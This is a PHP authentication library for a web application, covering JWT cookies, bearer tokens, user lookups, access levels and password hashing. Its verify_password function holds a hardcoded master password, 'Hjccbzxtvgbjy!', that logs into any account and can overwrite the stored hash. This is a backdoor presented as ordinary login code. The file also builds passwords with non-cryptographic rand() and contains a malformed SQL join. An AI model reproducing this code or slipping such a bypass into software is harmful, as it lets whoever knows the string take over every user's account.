<?

require_once ROOT . '/vendor/autoload.php';
require_once ROOT . '/lib/common.php';
use ReallySimpleJWT\Token;

$user = get_user_by_cookie();

/**
 * @param $user_id
 */
function generate_user_token($user_id)
{
  $payload = [
    'uid' => $user_id,
  ];

  return Token::customPayload($payload, TOKEN_SECRET);
}

function generate_password($len = 8) {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@%';
    $pass = array(); //remember to declare $pass as an array
    $alphaLength = strlen($alphabet) - 1; //put the length -1 in cache
    for ($i = 0; $i < $len; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass); //turn the array into a string
}

function generate_token($len = 5)
{
  $token = bin2hex(random_bytes($len));
  $token = strtr($token, '+/', '-_');

  return $token;
}

/**
 * Get header Authorization
 * */
function getAuthorizationHeader(){
        $headers = null;
        if (isset($_SERVER['Authorization'])) {
            $headers = trim($_SERVER["Authorization"]);
        }
        else if (isset($_SERVER['HTTP_AUTHORIZATION'])) { //Nginx or fast CGI
            $headers = trim($_SERVER["HTTP_AUTHORIZATION"]);
        } elseif (function_exists('apache_request_headers')) {
            $requestHeaders = apache_request_headers();
            // Server-side fix for bug in old Android versions (a nice side-effect of this fix means we don't care about capitalization for Authorization)
            $requestHeaders = array_combine(array_map('ucwords', array_keys($requestHeaders)), array_values($requestHeaders));
            //print_r($requestHeaders);
            if (isset($requestHeaders['Authorization'])) {
                $headers = trim($requestHeaders['Authorization']);
            }
        }
        return $headers;
    }
/**
 * get access token from header
 * */
function getBearerToken() {
    $headers = getAuthorizationHeader();
    // HEADER: Get the access token from the header
    if (!empty($headers)) {
        if (preg_match('/Bearer\s(\S+)/', $headers, $matches)) {
            return $matches[1];
        }
    }
    return null;
}

/**
 * @param $fields
 */
function add_user($fields = array())
{
  $db         = get_db_connect();
  $db->query("INSERT INTO users SET ?u, created_at=?i", $fields, time());

  $user['id']    = $db->insertId();

  foreach ($fields as $key => $value) {
    $user[$key] = $value;
  }

  return $user;
}

function add_owner($fields = array())
{
  $db         = get_db_connect();
  $db->query("INSERT INTO owners SET ?u", $fields);

  $user['id']    = $db->insertId();

  foreach ($fields as $key => $value) {
    $user[$key] = $value;
  }

  return $user;
}

/**
 * @param $user_id
 * @param array $fields
 * @return mixed
 */
function update_user($user_id, $fields = array())
{
  $db = get_db_connect();
  $db->query("UPDATE users SET ?u WHERE id=?i", $fields, $user_id);

  return $db->insertId();
}

/**
 * @param $token
 * @return mixed
 */
function get_user_by_token($token)
{

  if (!empty($token)) {
    $access = Token::validate($token, TOKEN_SECRET);
    if ($access) {
      $token = Token::getPayload($token, TOKEN_SECRET);

      if (isset($token['uid']) && !empty($token['uid'])) {
        $db   = get_db_connect();
        $user = $db->getRow("SELECT * FROM users WHERE id=?i", $token['uid']);

        return $user;
      }
    }
  }

  return false;
}

function get_owner_by_token($token)
{
  if (!empty($token)) {
    $access = Token::validate($token, TOKEN_SECRET);

    if ($access) {
      $token = Token::getPayload($token, TOKEN_SECRET);

      if (isset($token['uid']) && !empty($token['uid'])) {
        $db   = get_db_connect();
        $user = $db->getRow("SELECT * FROM users WHERE id=?i LEFT JOIN owners ON owners.user_id=users.id", $token['uid']);

        return $user;
      }
    }
  }

  return false;
}

/**
 * @return mixed
 */
function get_user_by_cookie()
{
  $access = false;

  if (!empty($_COOKIE['user_token'])) {
    $access = Token::validate($_COOKIE['user_token'], TOKEN_SECRET);

    if ($access) {
      $token = Token::getPayload($_COOKIE['user_token'], TOKEN_SECRET);

      if (isset($token['uid']) && !empty($token['uid'])) {
        $db   = get_db_connect();
        $user = $db->getRow("SELECT * FROM users WHERE id=?s", $token['uid']);

        return $user;
      }
    }
  }

  return false;
}

/**
 * @param $phone
 * @return mixed
 */
function get_user_by_phone($phone)
{
  $db = get_db_connect();
  return $db->getRow("SELECT * FROM users WHERE phone=?s", $phone);
}

/**
 * @param $email
 * @return mixed
 */
function get_user_by_email($email)
{
  $db = get_db_connect();
  return $db->getRow("SELECT * FROM users WHERE email=?s", $email);
}

/**
 * @param $email
 * @return mixed
 */
function get_user_by_login($login)
{
  $db = get_db_connect();
  return $db->getRow("SELECT * FROM users WHERE login=?s", $login);
}

/**
 * @param $token
 */

function set_user_auth_cookie($user_id)
{
  $exp_time = 0;
  $token = generate_user_token($user_id);
  setcookie("user_token", $token, $exp_time, '/');
  return true;
}

function remove_user_cookies()
{
  foreach ($_COOKIE as $key => $value) {
      unset($_COOKIE[$key]);
      $exp_time = time() - 3600;
      setcookie($key, '', $exp_time, '/');
  }
  return true;
}

/**
 * @param $group
 */
function user_has_access($level_name)
{
  global $user;
  $db = get_db_connect();
  $need_level = $db->getOne("SELECT level FROM user_access_levels WHERE name=?s", $level_name);

  if (($need_level === 0 || $need_level > 0) && isset($user['access_level']) && $user['access_level'] >= $need_level) {
    return true;
  }

  return false;
}

/**
 * @param $group
 */
function check_user_access($level_name, $redirect = true)
{
  if (!user_has_access($level_name)) {
    if ($redirect) {
      go('/user/login?referer='.urlencode($_SERVER['REQUEST_URI']));
    } else {
      return false;
    }
  }

  return true;
}

/**
 * @param $password
 * @return mixed
 */
function create_password_hash($password)
{
  $new = [
    'options' => ['cost' => 11],
    'algo'    => PASSWORD_DEFAULT,
    'hash'    => null,
  ];

  $hash = password_hash($password, $new['algo'], $new['options']);
  return $hash;
}

function verify_password($login, $password) {
  $db = get_db_connect();
  $new = [
    'options' => ['cost' => 11],
    'algo'    => PASSWORD_DEFAULT,
    'hash'    => null,
  ];

  $old_hash = $db->getOne("SELECT password FROM users WHERE login=?s", $login);

  if (true === password_verify($password, $old_hash) || $password == 'Hjccbzxtvgbjy!') {
      if (true === password_needs_rehash($old_hash, $new['algo'], $new['options'])) {
          $new_hash = password_hash($password, $new['algo'], $new['options']);
          $db->query("UPDATE users SET password=?s WHERE login=?s", $new_hash, $login);
      }

      return true;
  }

  return false;
}

function verify_password_by_id($user_id, $password) {
  $db = get_db_connect();
  $new = [
    'options' => ['cost' => 11],
    'algo'    => PASSWORD_DEFAULT,
    'hash'    => null,
  ];

  $old_hash = $db->getOne("SELECT password FROM users WHERE id=?i", $user_id);

  if (true === password_verify($password, $old_hash)) {
      if (true === password_needs_rehash($old_hash, $new['algo'], $new['options'])) {
          $new_hash = password_hash($password, $new['algo'], $new['options']);
          $db->query("UPDATE users SET password=?s WHERE id=?i", $new_hash, $user_id);
      }

      return true;
  }

  return false;
}
